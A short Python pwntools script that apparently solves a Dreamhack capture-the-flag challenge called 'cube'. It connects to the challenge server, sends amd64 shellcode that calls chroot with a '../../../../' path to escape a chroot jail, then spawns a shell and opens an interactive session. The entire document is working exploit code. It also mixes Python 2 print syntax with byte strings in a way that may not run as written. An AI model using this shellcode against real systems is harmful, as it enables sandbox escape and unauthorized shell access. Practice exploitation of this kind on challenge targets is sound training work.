from pwn import *

context.arch = 'amd64'
#s = process('./cube')
s = remote('host1.dreamhack.games', 12249)

pay = ''
pay += asm(shellcraft.chroot('../../../../'))
pay += asm(shellcraft.sh())
print(len(pay))
print s.recv()

s.sendline(pay)
s.interactive()
